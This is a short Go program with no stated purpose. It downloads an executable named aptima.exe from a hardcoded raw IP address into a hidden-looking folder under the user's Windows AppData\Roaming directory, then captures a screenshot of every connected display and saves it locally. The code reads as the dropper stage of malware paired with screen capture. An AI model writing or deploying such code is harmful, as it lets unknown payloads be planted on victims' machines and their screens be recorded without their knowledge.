package main

import (
	"fmt"
	"image"
	"image/png"
	"io"
	"net/http"
	"os"
	"runtime"

	"github.com/kbinani/screenshot"
)

const (
	URL = "http://195.154.191.13"
)

func UserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}

// save *image.RGBA to filePath with PNG format.
func save(img *image.RGBA, filePath string) {
	file, err := os.Create(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	png.Encode(file, img)
}

func downloadFile(filepath string, url string) (err error) {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
func download() {
	homeDir := UserHomeDir() + "\\AppData\\Roaming\\aptima\\aptima.exe"
	fmt.Println(homeDir)
	if _, err := os.Stat(homeDir); err == nil {
		fmt.Printf("File exists\n")
	} else {
		fmt.Printf("File does not exist\n")
		downloadFile(homeDir, URL+"/aptima.exe")
	}

}

func main() {
	download()
	// Capture each displays.
	n := screenshot.NumActiveDisplays()
	if n > 0 {

		var all image.Rectangle = image.Rect(0, 0, 0, 0)

		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			all = bounds.Union(all)
		}

		// Capture all desktop region into an image.
		fmt.Printf("%v\n", all)
		img, err := screenshot.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
		if err == nil {
			save(img, "all.png")
		} else {
			fmt.Printf("cannot take screen \n")
		}
	} else {
		fmt.Println("no screen found")
	}

}
